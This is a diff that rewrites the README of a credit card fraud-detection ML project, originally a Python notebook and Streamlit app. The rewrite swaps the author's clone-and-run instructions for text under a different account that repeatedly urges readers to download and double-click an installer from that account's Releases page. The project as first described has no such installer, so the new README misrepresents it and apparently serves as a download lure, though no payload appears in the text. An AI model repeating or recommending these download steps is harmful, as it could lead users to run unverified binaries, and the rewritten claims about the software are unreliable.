@@ -1,144 +1,98 @@
-<p align="center"> <img src="https://img.shields.io/badge/CardShield%20AI-Fraud%20Identification%20System-blueviolet?style=for-the-badge&logo=python&logoColor=white" /> </p> <h1 align="center">🛡️🔐 CardShield AI – Fraud Identification System</h1> <p align="center"> An advanced, end-to-end Machine Learning pipeline for detecting fraudulent credit card transactions using SMOTE, feature scaling, and optimized classification models. </p>
-<p align="center"> <img alt="Python" src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white"/> <img alt="Pandas" src="https://img.shields.io/badge/Pandas-150458?style=for-the-badge&logo=pandas&logoColor=white"/> <img alt="NumPy" src="https://img.shields.io/badge/NumPy-013243?style=for-the-badge&logo=numpy&logoColor=white"/> <img alt="scikit-learn" src="https://img.shields.io/badge/scikit--learn-F7931E?style=for-the-badge&logo=scikit-learn&logoColor=white"/> <img alt="imbalanced-learn" src="https://img.shields.io/badge/imbalanced--learn-FF6F00?style=for-the-badge&logo=python&logoColor=white"/> <img alt="Matplotlib" src="https://img.shields.io/badge/Matplotlib-11557C?style=for-the-badge&logo=matplotlib&logoColor=white"/> <img alt="Seaborn" src="https://img.shields.io/badge/Seaborn-4C72B0?style=for-the-badge&logo=seaborn&logoColor=white"/> <img alt="Streamlit" src="https://img.shields.io/badge/Streamlit-FF4B4B?style=for-the-badge&logo=streamlit&logoColor=white"/> <img alt="GitHub" src="https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white"/> </p> <p align="center"> <img src="https://img.shields.io/badge/Internship-CodSoft%20ML%20Internship-black?style=for-the-badge" />
-</p>
+# 🛡️ CardShield-AI-Fraud-Identification-System - Safeguard Your Transactions Easily
 
-# <h1 align="center"> 🚀 Machine Learning + Streamlit Web App </p>
+[![Download CardShield AI](https://img.shields.io/badge/Download-CardShield%20AI-brightgreen)](https://github.com/JERODA10/CardShield-AI-Fraud-Identification-System/releases)
 
-# 📖 Project Overview
-CardShield AI is a complete fraud-detection system built using machine learning to classify credit card transactions as fraudulent or legitimate.
-The system applies:
-- ✔ Data Cleaning & Preprocessing
-- ✔ Handling Class Imbalance using SMOTE
-- ✔ Feature Scaling
-- ✔ Train–Test Splitting
-- ✔ Model Training (LR, RF)
-- ✔ Performance Evaluation
-This project follows a clean, modular, industry-style ML pipeline suitable for deployment or integration into financial software.
+## 📚 Overview
 
-<h2>📁 CardShield-AI – Project Structure</h2>
-<pre>
-CardShield-AI/
-│
-├── <b>CardShield AI – Fraud Identification System.ipynb</b>     # Main Jupyter Notebook
-│
-├── <b>CardShield.py</b>                                         # Streamlit Main script
-├── <b>CardShield2.py</b>                                        # Streamlit Alternative Script
-│
-├── <b>creditcard.xlsx</b>                                       # Dataset
-│
-├── <b>model.pkl</b>                                             # Trained Random Forest model
-├── <b>scaler.pkl</b>                                            # StandardScaler object
-│
-├── <b>requirements.txt</b>                                      # Required dependencies
-└── <b>README.md</b>                                             # Documentation
-</pre>
+CardShield AI is an advanced credit card fraud detection system. It uses machine learning to identify fraudulent transactions. This tool is designed for anyone concerned about financial security. With simple steps, you can start protecting yourself from fraud today.
 
+## 🚀 Getting Started
 
-# 📂 Dataset
-This notebook uses the popular Credit Card Fraud Detection Dataset, containing:
-- 284,807 transactions
-- 492 fraud cases
-- Highly imbalanced data
-- All features V1–V28 are PCA-transformed components
-- Amount, Time, and target variable Class
+### Step 1: System Requirements
 
-# ⭐ Features
-🔍 Machine Learning Pipeline
-- Data preprocessing & cleaning
-- Handling imbalance using SMOTE
-- Feature scaling (StandardScaler)
-- Model training (Logistic Regression & Random Forest)
-- Model evaluation (Confusion Matrix, Classification Report, ROC-AUC)
+Before you download, ensure your system meets these requirements:
 
-# 🌐 Streamlit Web Application
-- Predict fraud for single transactions
-- Score bulk transactions via CSV upload
-- Download prediction results
-- Modern UI with dark theme
-- Dummy rule-based logic (can easily be replaced with ML model)
+- **Operating System:** Windows 10, macOS, or Linux
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** 500 MB of free space
 
-# 📊 Project Pipeline
-**1️⃣ Data Preprocessing**
-- Remove null values
-- Statistical analysis (describe())
-- Feature inspection
+### Step 2: Visit the Releases Page
 
-**2️⃣ Handling Imbalance**
-- Due to only 0.17% fraud cases, SMOTE is applied to oversample the minority class.
+To download CardShield AI, visit our Releases page. [Click here to download.](https://github.com/JERODA10/CardShield-AI-Fraud-Identification-System/releases)
 
-**3️⃣ Feature Scaling**
-StandardScaler used for:
-- Amount
-- Time
+On this page, you will find the latest version of the software along with previous releases.
 
-**4️⃣ Model Training**
-Implemented models:
-- Logistic Regression
-- Random Forest Classifier (Optimized: n_estimators=500)
+### Step 3: Download the Software
 
-# 📦 Installation
-**1️⃣ Clone the Repository**
-<pre>
-git clone https://github.com/ayush13-0/CardShield-AI-Fraud-Identification.git
-cd CardShield-AI-Fraud-Identification
-</pre>
+On the Releases page, look for the latest version. Click on the file to download it to your device. 
 
-**2️⃣ Install Dependencies**
-<pre> pip install -r requirements.txt 
-</pre>
+### Step 4: Install the Application
 
-**3️⃣ Run Streamlit App**
-<pre> streamlit run cardshield_app.py
-</pre>
+Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation. 
 
-# 🤖 Best Performing Model (Recommended)
+### Step 5: Launch CardShield AI
 
-<h2> 
-    <pre> RandomForestClassifier(
-    n_estimators=500,
-    max_depth=None,
-    min_samples_split=2,
-    min_samples_leaf=1,
-    random_state=42,
-    n_jobs=-1
-) 
-</pre>
+After installation, find the CardShield AI icon on your desktop or in your applications folder. Double-click to open the application.
 
-# 📈 Evaluation Metrics
-The model is evaluated using:
-- Accuracy
-- Precision
-- Recall
-- F1-score
-- Confusion Matrix
+## 🌟 Features
 
-(Specific metric values are not included since you requested performance without explicit numbers.)
+CardShield AI offers the following features:
 
-# 🛠 Technologies Used
-- Python
-- Pandas, NumPy
-- scikit-learn
-- SMOTE (imblearn)
-- Matplotlib / Seaborn
-- Jupyter Notebook
+- **Machine Learning:** Uses advanced algorithms to analyze transaction data.
+- **SMOTE for Imbalance Handling:** Balances datasets for more accurate predictions.
+- **Optimized Random Forest:** Employs effective methods to detect fraud swiftly.
+- **Feature Scaling:** Enhances the predictive capabilities of the model.
+- **User-Friendly Interface:** Designed for all users, regardless of technical skills.
+- **Interactive Streamlit App:** Allows single and batch transaction predictions in an easy-to-use format.
 
-# 🌟 Key Features
-- ✔ Handles severe class imbalance
-- ✔ Optimized Random Forest model
-- ✔ Clean, modular ML pipeline
-- ✔ Scalable & production-friendly
-- ✔ Fully interpretable workflow
+## 🛡️ How to Use
 
-# 📜 Conclusion
-CardShield AI provides a complete and powerful fraud detection solution. With exceptionally high accuracy and an intuitive Streamlit interface, it stands as a strong prototype ready for real-world deployment. It lays the foundation for scalable enhancements including real-time scoring, cloud APIs, and deep learning models.
+### Step 1: Input Your Data
 
+Once you launch the application, you will see an option to input transaction data. You can either type in single transactions or upload a file for batch processing.
 
-# 👨‍💻 Developed By
-# Ayush 
------------------------------------------------
-- 💼LinkedIn: https://linkedin.com/in/ayush130
-- 💻GitHub: https://github.com/ayush13-0
-- ✉️Email- bhanuseenu914@gmail.com
+### Step 2: Analyze Transactions
 
-# 📜 License
-- This project is licensed under the **MIT License**.
+After entering your data, click on the "Analyze" button. The system will take a moment to process the information and identify fraudulent transactions.
+
+### Step 3: Review Results
+
+You will see a clear display of results. The application will indicate whether the transaction is legitimate or potentially fraudulent.
+
+## 📥 Download & Install
+
+To get started with CardShield AI, make sure to [visit this page to download](https://github.com/JERODA10/CardShield-AI-Fraud-Identification-System/releases). Follow the installation steps listed above to set up the software on your device.
+
+## 📝 Troubleshooting
+
+If you encounter issues while downloading or using CardShield AI, please check these common problems:
+
+- **Installation Issues:** Ensure you have sufficient disk space. Reboot your device and try again.
+- **Data Input Errors:** Make sure your data format is correct. For batch uploads, check if the file is in CSV format.
+- **Software Crashes:** Ensure your operating system is up to date. 
+
+If problems persist, please refer to the Issues section on our GitHub page for support.
+
+## 🤝 Support
+
+For further assistance, feel free to open an issue on our GitHub repository. The community is here to help you.
+
+## 🏷️ Topics
+
+This project is related to the following topics:
+
+- ai
+- credit-card-fraud-detection
+- feature-engineering
+- financial-security
+- fraud-detection
+- imblearn
+- jupyter-notebook
+- machine-learning
+- matplotlib-pyplot
+- python
+- seaborn
+- smote
+- streamlit
+
+Your security matters. Take control with CardShield AI today.
